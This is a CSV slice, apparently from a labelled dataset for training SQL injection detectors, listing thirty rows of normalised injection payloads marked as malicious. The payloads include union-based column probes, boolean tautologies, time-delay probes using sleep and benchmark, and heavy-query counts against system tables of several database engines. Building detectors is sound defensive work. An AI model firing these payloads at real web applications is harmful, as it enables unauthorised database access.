row_index,payload_norm,label,sqli_type_hint
2460,"-5217'|| ( select 'juen' from dual where 7336 = 7336 union all select 7336,7336,7336--",1,
2461,1' ) ) as egsj where 3447 = 3447,1,
2462,"1"" ) as ssbz where 8885 = 8885 union all select null,null,null,null,null,null,null,null,null--",1,
2463,-6298' or 4724 = 4876,1,
2464,"select sleep ( 5 ) and ( ( ( ""wucy"" like ""wucy",1,
2465,-1802' or 7931 = 5841--,1,
2466,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'teng' like 'teng",1,
2467,"1 union all select null,null,null,null,null#",1,
2468,"1', ( select ( case when ( 1902 = 5536 ) then 1 else 1902* ( select 1902 from master..sysdatabases ) end ) )",1,
2469,"-1390%"" ) ) union all select 8930,8930,8930,8930,8930#",1,
2470,"1 where 1992 = 1992 union all select null,null--",1,
2471,"1"" and 5205 = 9975#",1,
2472,"1' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",1,
2473,-4057' ) order by 1#,1,
2474,"-8929%' ) union all select 9486,9486,9486,9486#",1,
2475,"-3462 ) ) as biyl where 5143 = 5143 union all select 5143,5143,5143--",1,
2476,"-2570"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""dmch"" like ""dmch",1,
2477,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 3127 = 3127",1,
2478,-6218' ) ) or 2236 = 4469#,1,
2479,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ""vzft"" = ""vzft",1,
2480,"-2071 union all select 4753,4753--",1,
2481,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) -- sztf",1,
2482,"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'aezm' like 'aezm",1,
2483,"1"" where 7380 = 7380 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
2484,"1' ) as rqfq where 7077 = 7077 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
2485,"-1076 union all select 3959,3959--",1,
2486,"1' ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( 'tpeo' like 'tpeo",1,
2487,"1 ) ) union all select null,null,null,null#",1,
2488,1'|| ( select 'kuxp' where 7123 = 7123 and 1688 = 4200#,1,
2489,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",1,
